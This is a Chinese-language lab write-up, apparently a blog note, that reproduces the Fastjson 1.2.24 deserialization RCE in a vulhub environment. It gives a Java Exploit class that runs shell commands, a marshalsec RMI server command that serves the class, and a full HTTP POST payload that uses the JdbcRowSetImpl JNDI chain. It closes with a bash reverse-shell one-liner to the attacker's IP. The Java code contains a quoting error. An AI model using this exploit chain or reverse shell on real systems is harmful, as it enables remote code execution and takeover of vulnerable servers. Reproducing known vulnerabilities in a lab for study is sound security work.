Fastjson反序列化漏洞复现

准备

vulhub的fastjson环境(1.2.24.rec)(jdk1.8.0_102)

(自行编译marshalsec.jar)https://github.com/mbechler/marshalsec



攻击IP：192.168.0.110:7000

rmi服务器: 192.168.0.110:9000

被攻击服务器地址：192.168.0.110:8090



因为目标环境是Java 8u102，没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以使用`com.sun.rowset.JdbcRowSetImpl`的利用链，借助JNDI注入来执行命令。

------

准备序列化文件Exploit.java并对其使用javac编译成Exploit.class

```
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"bash, "-c", "touch /POC"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            
        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }
        
        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```

然后将Exploit.class文件上传到我们的攻击服务器上

![image-20201207202522946](/Users/myhome/Library/Application Support/typora-user-images/image-20201207202522946.png)



再然后我们借助marshalsec项目，启动一个RMI服务器，监听9000端口，利用RMI服务器中转下载远程序列化类`Exploit.class`：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.110/#Exploit" 9000
```

![屏幕快照 2020-12-07 下午8.35.15](/Users/myhome/Desktop/屏幕快照 2020-12-07 下午8.35.15.png)

最后向被攻击服务器发送payload

> **POST** / HTTP/1.1
> Host: 192.168.0.118:8090
> Accept-Encoding: gzip, deflate
> Accept: */*
> Accept-Language: en
> User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
> Connection: close
> **Content-Type: application/json**
> Content-Length: 160
>
> **{**
>     **"b":{**
>         **"@type":"com.sun.rowset.JdbcRowSetImpl",**
>         **"dataSourceName":"*rmi://192.168.0.110:9000/Exploit*",**
>         **"autoCommit":true**
>     **}**
> **}**



执行结果

![屏幕快照 2020-12-07 下午8.40.47](/Users/myhome/Desktop/屏幕快照 2020-12-07 下午8.40.47.png)

rmi服务器返回结果

![屏幕快照 2020-12-07 下午8.41.02](/Users/myhome/Desktop/屏幕快照 2020-12-07 下午8.41.02.png)

登入被攻击服务器查看反序列化类的命令执行成功执行。

![屏幕快照 2020-12-07 下午8.42.54](/Users/myhome/Desktop/屏幕快照 2020-12-07 下午8.42.54.png)

exec bash -i &>/dev/tcp/192.168.0.110/8002 <&1                                                        